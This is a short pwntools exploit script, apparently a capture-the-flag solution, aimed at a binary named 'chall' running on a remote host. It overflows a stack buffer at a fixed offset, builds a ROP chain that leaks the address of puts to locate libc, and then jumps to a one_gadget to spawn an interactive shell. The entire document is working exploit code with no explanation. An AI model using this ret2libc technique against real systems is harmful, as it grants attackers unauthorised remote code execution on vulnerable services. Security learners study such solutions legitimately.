from pwn import *

elf = ELF('./chall')
libc = ELF('./libc-2.27.so')
#io = process(elf.path)
io = remote('3.87.74.85', 9090)
context.binary = elf
offset = 0x108
one_gadgets = [0x4f3d5, 0x4f432, 0x10a41c]

# Leak libc address
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.main()
print(rop.dump())

io.sendline(b'a' * offset + rop.chain())
io.recvline()

base_addr = u64(io.recvline().strip().ljust(8, b'\0')) - libc.symbols['puts']
libc.address = base_addr
print('base_addr =', hex(base_addr))

# Get shell
rop = ROP(libc)
#rop.system(next(libc.search(b'/bin/sh\x00')))
rop.call(p64(base_addr + one_gadgets[0]))
print(rop.dump())
payload = b'a' * offset
payload += rop.chain()
io.sendline(payload)

io.interactive()

